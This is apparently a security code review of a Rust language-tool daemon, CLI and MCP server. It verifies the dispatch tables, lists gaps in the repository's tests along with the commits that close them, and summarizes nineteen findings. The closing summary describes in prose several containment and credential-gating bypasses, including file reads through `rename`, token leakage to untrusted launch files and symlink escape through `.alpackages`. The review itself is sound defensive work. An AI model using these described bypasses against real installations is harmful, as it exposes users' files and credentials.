- **r2-merge `text` and `-32002`** — `error_codes::PATH_NOT_AUTHORIZED` is `-32002`
  (`al-protocol/src/jsonrpc.rs:236`); `file_uri_from_params` refuses `text` outright
  (`daemon/mod.rs:1575-1579`); `read_document_from_params` refuses it for a path inside the
  project (`:1656-1666`) and drops the document on `Drop` (`:1613-1617`). The CLI's
  `READ_ONLY_FILE_METHODS` (`al-explorer/src/cli/commands/mod.rs:540-554`) lists exactly the 14
  dispatchers that call `read_document_from_params`, and exactly the 14 the daemon reference
  names at `Docs/reference/daemon-methods.md:138-141`.
- **r2-merge Windows containment display (`display_path`)** — `simplify_verbatim`
  (`containment.rs:35-53`) plus `a_verbatim_prefix_is_stripped_for_display` and
  `a_path_with_no_plainer_spelling_is_left_alone`, both plain-text so they run on Linux.
- **daemon build identity (45341c12)** — `handshake` is dispatched once
  (`daemon/mod.rs:1024`), the daemon captures its identity before it serves
  (`daemon/mod.rs:223`), and `connect_checked` (`client.rs:444-503`) replaces a mismatched
  daemon at most once and then continues with a warning rather than looping.
- **dispatch table integrity** — the 93 method literals in `dispatch_method`
  (`daemon/mod.rs:847-1116`) contain no duplicate, every one appears in
  `Docs/reference/daemon-methods.md`, every `method:` on an MCP tool is a dispatched method, and
  every `al_*` tool name in `mcp.rs` appears in `Docs/reference/mcp-tools.md` and the reverse.
- **projection and scope targets** — each of the 22 root-array methods in
  `projection::list_target` returns a `Vec` (checked through to the query function: for example
  `dead_code -> Vec<UnusedSymbol>`, `native_semantic_checks -> Vec<NativeFinding>`,
  `discover_tests -> Vec<TestCodeunit>`, `arch_lint -> Vec<ArchViolation>`), and each of the 8
  field targets names a real `Vec` field on the result struct (`EventDiscoveryResult::events`,
  `PermissionAuditReport::coverage`). `scope::scoped_list`'s four methods are the four the docs
  and the module comment claim.
- **`--company` on `snapshot`/`profile` (r1-emit finding)** — `required = true` on all five
  subcommands (`al-explorer/src/cli/subcommands.rs:115`, `:136`, `:153`, `:175`, `:196`), and no
  shipped task, script or skill invokes them without it.
- **relative `file` against the project root** — the CLI never sends a relative path: every
  single-file command builds an absolute canonical `file://` URI through `file_to_uri`
  (`al-explorer/src/cli/commands/mod.rs:170-189`), so the change reaches only MCP callers, which
  is what the reference documents.

## Gaps in the repo's own consistency tests

These are the checks the merge relied on, and what each one does not see. Each is followed by
the test that now covers it.

- `daemon_reference_names_every_dispatched_method` (`daemon/mod.rs:2054`) checks
  dispatcher -> docs only. It would not notice a documented method that no longer dispatches, a
  method routed to the wrong dispatcher, or a dispatcher that skips containment (which is how
  `rename` survived).
  - closed by 3c88ea2f: `the_reference_catalogue_lists_only_methods_that_dispatch` reads the
    reference's method lists and fails on a name the dispatch table does not hold, and
    `every_path_dispatcher_refuses_a_file_outside_the_project` drives each declared path method
    through `dispatch_request`. A method routed to the wrong dispatcher is still not caught:
    nothing states what each method's answer should look like beyond its list shape.
- Nothing compares `projection::list_target` or `scope::scoped_list` against the shapes the
  dispatchers actually return, so a wrong field name is a silent no-op rather than a failure.
  - closed by aa61a42c: `every_declared_list_is_where_the_declaration_says` drives all 30
    declared methods against an empty project and checks the shape each declaration promises,
    and `scope_and_projection_agree_on_where_each_list_is` pins the four that take both.
- Nothing compares the CLI's `READ_ONLY_FILE_METHODS` with the set of dispatchers that call
  `read_document_from_params`; the two agree today by hand.
  - closed by 3c88ea2f: the list moved to `al_protocol::methods::TEXT_CAPABLE_METHODS`, which
    both crates read, and `the_text_capable_methods_are_the_read_dispatchers` holds it against
    the methods the dispatch table declares as `PathUse::Read`.
- The containment tests all call the helper directly. No test drives a dispatcher with an
  out-of-project path.
  - closed by cbd148a4 and 3c88ea2f: `rename_refuses_a_path_outside_the_project_and_leaves_no_document`
    and the table walk above.
- `src/settings_test.rs:231` covers `is_worktree_resident_program` with six literal paths and no
  normalisation case.
  - closed by 216e47f9: `a_worktree_program_is_refused_however_the_path_is_spelled` covers
    `..`, `.`, repeated separators, a trailing separator, Windows case and separator forms, a
    `..` above the filesystem root, and the outside paths that must stay accepted.

Two more the reviewers did not list, added with the fixes:

- `the_authorized_dispatchers_are_the_ones_the_trust_doc_names` (3c88ea2f, 490e2eb2) holds the
  methods that reach a Business Central credential against the trust document, and
  `an_authorized_dispatcher_refuses_an_untrusted_repository_target` drives `debug` and
  `publish` against an untrusted repository launch file.
- `the_settings_reference_marks_every_gated_key` (5736d552) fails when a trust-gated setting
  loses its mark in the settings reference.


## Review complete

Nineteen findings: four high, four medium, eleven low. All four high ones are security.
The worst is that two dispatchers skip a gate the rest of the code passes through: `rename`
never calls `file_uri_from_params`, so it reads any file the daemon's user can and seeds the
document store for later reads, and `tests.snapshot_capture` acquires the cached Business
Central token without `authorize_cached_credential`, so an untrusted repository's launch file
can still receive it.
Containment holds for `..` and for symlinks a caller names, and it is undone from the other
side: `.alpackages` is a containment root, nothing checks what it is, and a symlink there
canonicalises the boundary onto whatever it points at.
The Zed extension's worktree-binary refusal compares strings without normalising, so an
absolute path spelled with `..` through the worktree root is accepted and run unverified.
The daemon dispatch table survived the three hand merges intact: 93 arms, no duplicate, every
one documented, every MCP tool method dispatched, and every projection and scope target
matching the shape its dispatcher returns.
What the repo's own tests cannot see is the pattern behind the first two findings: they check
the helpers, not that each dispatcher uses them, and nothing walks the dispatch table.
